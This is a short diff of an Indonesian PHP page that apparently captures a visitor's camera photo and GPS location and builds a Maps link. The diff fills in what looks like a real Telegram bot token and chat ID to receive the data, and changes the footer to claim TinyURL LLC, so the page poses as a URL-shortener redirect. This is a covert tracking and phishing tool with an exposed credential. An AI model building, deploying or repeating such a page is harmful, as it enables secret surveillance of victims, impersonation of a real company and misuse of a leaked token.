@@ -84,8 +84,8 @@ file_put_contents($filename, $photoData);
 
 // Token dan Chat ID Telegram
 // Buatan Algaza IG @cosplaysulit
-$token = 'Token_Telegram_Mu';
-$chat_id = 'Chat_ID_MU';
+$token = '7623171777:AAFQG-B5onbHZA1a5QW6-xyyH3rNB64cWCY';
+$chat_id = '-1002643367948';
 
 // Buat Link Google Maps
 // Buatan Algaza IG @cosplaysulit
@@ -159,7 +159,7 @@ if ($gps !== 'Tidak Ada' && strpos($gps, ',') !== false) {
                 <a href="<?= htmlspecialchars($alamat); ?>" class="btn btn-primary mt-3">Lanjutkan ke LINK</a>
             </div>
             <div class="card-footer text-center text-light">
-                <small>&copy; 2025 Algaza.my.id</small>
+                <small>Copyright &copy; TinyURL LLC</small>
             </div>
         </div>
     </div>
